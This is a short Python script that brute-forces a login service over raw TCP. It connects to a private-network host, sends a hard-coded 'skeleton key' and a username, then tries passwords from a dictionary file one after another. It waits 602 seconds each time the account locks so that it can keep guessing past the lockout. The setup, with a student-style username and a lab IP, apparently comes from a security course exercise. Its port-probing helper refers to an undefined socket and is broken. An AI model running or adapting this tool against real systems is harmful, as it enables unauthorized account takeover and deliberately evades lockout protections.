import re
import socket
import time
import datetime
# import sys
# sys.stdout = open('port.out', 'w')

HOST = '192.168.1.10'
SKELETONKEY = 'Passepartout'
BYTES = 1024
CRUZID = 'bosdhill\n'

def create_dict():
     passwords = []
     fp = open("dictionary.txt", "r")
     for _, line in enumerate(fp):
          passwords.append(line.replace('\n',''))
     return passwords

# Assuming NO initial lockout
def crack_password(PORT):
     passwords = create_dict()
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect((HOST, PORT))
     print("Sending skeletonkey...")
     s.sendall(SKELETONKEY)
     data = s.recv(BYTES)
     print("Data received: %s" % data)
     print("Sending username...")
     s.sendall(CRUZID)
     data = s.recv(BYTES)
     print("Received: %s" % data)
     i = -1
     while True:
          if data == 'Password: ':
               i += 1
               print("\tSending password %s..." % passwords[i])
               s.sendall(passwords[i])
               data = s.recv(BYTES)
               print("Received: %s" % data)
               if data == 'Incorrect password, goodbye.\n':
                    print("\tThe password %s was incorrect. :C" % passwords[i])
                    s.close()
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    print("\tReconnecting to %s over port %d..." % (HOST, PORT))
                    s.connect((HOST, PORT))
                    print("Sending skeletonkey...")
                    s.sendall(SKELETONKEY)
                    data = s.recv(BYTES)
                    print("Data received: %s" % data)
                    print("\tSending username...")
                    s.sendall(CRUZID)
                    data = s.recv(BYTES)
                    print("Received: %s" % data)
               else:
                    print("Password cracked! Password is %s" % passwords[i])
                    break
          elif data == 'Too many failed login attempts, account is locked for the next 600 seconds, goodbye.\n':
               print("\tOut of tries!")
               print("\t\tSleep for %d seconds at %s" % (602, str(datetime.datetime.now())))
               s.close()
               time.sleep(602)
               s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
               print("\t\tReconnecting to %s over port %d..." % (HOST, PORT))
               s.connect((HOST, PORT))
               print("Sending skeletonkey...")
               s.sendall(SKELETONKEY)
               data = s.recv(BYTES)
               print("Data received: %s" % data)
               print("\t\tSending username...")
               s.sendall(CRUZID)
               data = s.recv(BYTES)

def try_ports():
     fp = open("out", "r")
     for _, line in enumerate(fp):
          port = re.findall("[0-9]{5}", line)
          PORT = int(port[0])
          s.connect((HOST, PORT))
          s.sendall(SKELETONKEY)
          time.sleep(2)
          data = s.recv(BYTES)
          s.sendall(CRUZID)
          data = s.recv(BYTES)
          if data == 'Password: ':
               print('Received %s from port %d' % (repr(data), PORT))
               crack_password(PORT)

if __name__ == "__main__":
     crack_password(10247)







